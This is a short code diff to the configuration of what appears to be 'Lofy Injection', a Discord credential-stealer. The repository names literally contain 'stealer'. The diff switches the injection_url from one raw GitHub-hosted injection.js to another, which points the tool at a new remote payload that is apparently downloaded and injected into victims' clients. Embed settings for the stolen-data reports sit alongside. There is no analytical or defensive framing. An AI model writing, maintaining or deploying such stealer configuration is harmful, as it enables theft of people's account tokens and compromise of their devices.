@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Lofy Injection', 
   embed_icon: 'https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/wtflofystealerwtf/index/main/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/yyzx8/wtflofystealerwtf/main/injection.js', 
   /**
    
    **/
